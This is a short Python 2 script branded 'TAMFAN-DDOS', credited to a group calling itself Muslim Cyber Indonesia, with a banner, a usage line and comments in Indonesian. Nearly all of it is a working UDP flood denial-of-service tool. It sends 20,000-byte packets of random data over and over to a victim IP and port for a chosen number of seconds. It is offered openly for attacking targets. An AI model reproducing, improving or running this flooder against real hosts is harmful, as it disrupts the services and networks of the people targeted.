import time
import socket
import random
import sys
def usage():
    print "\033[1;32m############################################################"
    print "#-----------------------[\033[1;91mTAMFAN-DDOS\033[1;32m]-----------------------#"
    print "#----------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 TamfanDdos.py " "<ip> <port> <packet> \033[1;32m #"
    print "#                                                        ##"
    print "#\033[1;91mCreator:MrTamfanX  \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTeam   : MCI        \033[1;32m##     #      #                     ##"
    print "#\033[1;91mVersion:1.0        \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTQAdmin:MrTamfanX-MrRaphael-MrTheSpam-Mr.Dc-MrBlackHat  ##"
    print "#\033[1;91m       :LikeWhite-MrUknown-MrSanchez-MrBimbong-MrTamfan ##"
    print "#                     \033[1;91m ##     \033[1;32m#  \033[1;91m  \033[1;32   ##"
    print "#                     \033[1;91m##  \033[1;32m###   \033[1;91m  \033[1;32m   ##"
    print "#               \033[1;91m<--[MUSLIM CYBER INDONESIA]-->         \033[1;32m  ##"
    print "############################################################"
    print "     Member:Mr.ZeeX_IND-K.R.A.S-EelehIND-WhoAmI-Weyt.Tm"
    print "           PembuatDdos1:MrTamfanX Cyber Team"
    print "          PembuatDdos2:Muslim Cyber Indonesia"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

